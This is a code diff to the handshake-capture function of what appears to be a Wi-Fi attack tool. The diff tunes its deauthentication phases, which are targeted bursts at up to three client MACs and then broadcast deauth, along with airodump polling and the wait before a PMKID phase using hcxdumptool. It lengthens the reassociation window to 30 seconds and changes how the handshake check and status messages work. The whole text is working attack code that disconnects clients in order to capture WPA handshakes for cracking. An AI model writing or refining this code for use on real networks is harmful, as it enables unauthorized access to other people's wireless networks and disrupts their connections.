@@ -769,7 +769,7 @@ def capture_handshake(
         # ══════════════════════════════════════════════════════════════════
         # Phase 2: Targeted deauth — burst-and-wait (allows reassociation)
         # ══════════════════════════════════════════════════════════════════
-        REASSOC_WAIT = 5  # seconds of quiet after each burst for client to reassociate
+        REASSOC_WAIT = 30  # seconds of quiet after each burst for client to reassociate + handshake
 
         if top_clients:
             target_macs = [c.mac for c in top_clients[:3]]
@@ -808,22 +808,21 @@ def capture_handshake(
                 ])
                 child_procs.append(airodump_proc)
 
-            # Reassociation window — poll every second for handshake
+            # Reassociation window — poll every second for the full window
+            # Client needs silence to reconnect; handshake is captured on reassoc.
             reassoc_end = min(time.time() + REASSOC_WAIT, phase2_end, absolute_deadline)
             while time.time() < reassoc_end:
+                remaining = int(reassoc_end - time.time())
+                print(f'\r  [*] Reassoc window: {remaining:2d}s remaining...  ', end='', flush=True)
                 time.sleep(1)
                 cap = _find_cap(cap_prefix)
-                if cap:
+                if cap and _verify(cap, bssid, tmpdir):
                     elapsed = int(time.time() - start_time)
-                    print(f'  [*] Checking [{elapsed}s]...', end=' ', flush=True)
-                    if _verify(cap, bssid, tmpdir):
-                        print('FOUND!')
-                        logger.info("Handshake FOUND in Phase 2 at %ds (burst #%d)",
-                                    elapsed, burst_num)
-                        _cleanup_all()
-                        return _save(cap, bssid)
-                    print('not yet')
-                    break  # one check per reassoc window; next burst will follow
+                    print(f'\r  [+] Handshake FOUND! [{elapsed}s]                        ')
+                    logger.info("Handshake FOUND in Phase 2 at %ds (burst #%d)", elapsed, burst_num)
+                    _cleanup_all()
+                    return _save(cap, bssid)
+            print(f'\r  [*] No handshake in {REASSOC_WAIT}s window — sending next burst.     ')
 
         # ══════════════════════════════════════════════════════════════════
         # Phase 3: Broadcast deauth fallback — burst-and-wait
@@ -857,19 +856,17 @@ def capture_handshake(
 
                 reassoc_end = min(time.time() + REASSOC_WAIT, phase3_end, absolute_deadline)
                 while time.time() < reassoc_end:
+                    remaining = int(reassoc_end - time.time())
+                    print(f'\r  [*] Reassoc window: {remaining:2d}s remaining...  ', end='', flush=True)
                     time.sleep(1)
                     cap = _find_cap(cap_prefix)
-                    if cap:
+                    if cap and _verify(cap, bssid, tmpdir):
                         elapsed = int(time.time() - start_time)
-                        print(f'  [*] Checking broadcast [{elapsed}s]...', end=' ', flush=True)
-                        if _verify(cap, bssid, tmpdir):
-                            print('FOUND!')
-                            logger.info("Handshake FOUND in Phase 3 at %ds (burst #%d)",
-                                        elapsed, burst_num)
-                            _cleanup_all()
-                            return _save(cap, bssid)
-                        print('not yet')
-                        break
+                        print(f'\r  [+] Handshake FOUND! [{elapsed}s]                        ')
+                        logger.info("Handshake FOUND in Phase 3 at %ds (burst #%d)", elapsed, burst_num)
+                        _cleanup_all()
+                        return _save(cap, bssid)
+                print(f'\r  [*] No handshake in {REASSOC_WAIT}s window — next burst.          ')
 
         # ══════════════════════════════════════════════════════════════════
         # Phase 4: PMKID via hcxdumptool
